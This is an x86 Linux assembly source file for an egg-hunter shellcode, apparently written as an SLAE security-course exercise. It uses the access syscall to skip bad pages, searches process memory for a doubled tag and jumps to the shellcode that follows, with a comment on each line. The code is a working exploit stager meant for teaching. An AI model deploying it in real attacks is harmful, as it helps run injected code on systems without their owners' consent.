; Filename: 	egghunting.nasm
; Author:	Jakub Heba
; Purpose:	SLAE Course & Exam 

global _start			

section .text
_start:

	mov ebx, 0x50905090		; Our TAG

	xor ecx, ecx			; ECX cleaning
	mul ecx				; EAX and EDX cleaning

loop:
	or dx, 0xfff			; 4096 bytes for iteration

iteration:
	inc edx				; EDX is incremented

	pusha				; Pushing all general purpose registers on the stack, to prevent eg. EAX value from changing during syscall
	lea ebx, [edx+0x4]		; Putting EDX + 4 bytes into the EBX, for preparing to the syscall (EBX is the first argument)

	mov al, 0x21			; syscall defining (#define __NR_access 33)
	int 0x80			; syscall execution, return value stored in EAX
	
	cmp al, 0xf2			; comparing the return value with 0xf2, which means, that if syscall returns an EFAULT error, Zero Flag is set
	
	popa				; popping all general purpose registers from the stack
	
	jz loop				; If comparing returns True (EFAULT error, ZF set), next 4096 bytes of memory, and next iteration

	; Here, we are looking for the TAG in this part of memory	
	cmp [edx], ebx			; Check, that EDX points to our TAG value, and set ZF, if true
	
	jnz iteration			; If ZF is not set, JMP to the INC instruction and repeat the process
	
	cmp [edx+0x4], ebx		; Check, that we have our second TAG value, to prevent from mistakes
						
	jnz iteration			; If ZF is not set, JMP to the INC instruction and repeat the process, otherwise, eggs are found
	
	jmp edx				; JMP directly to the right Shellcode
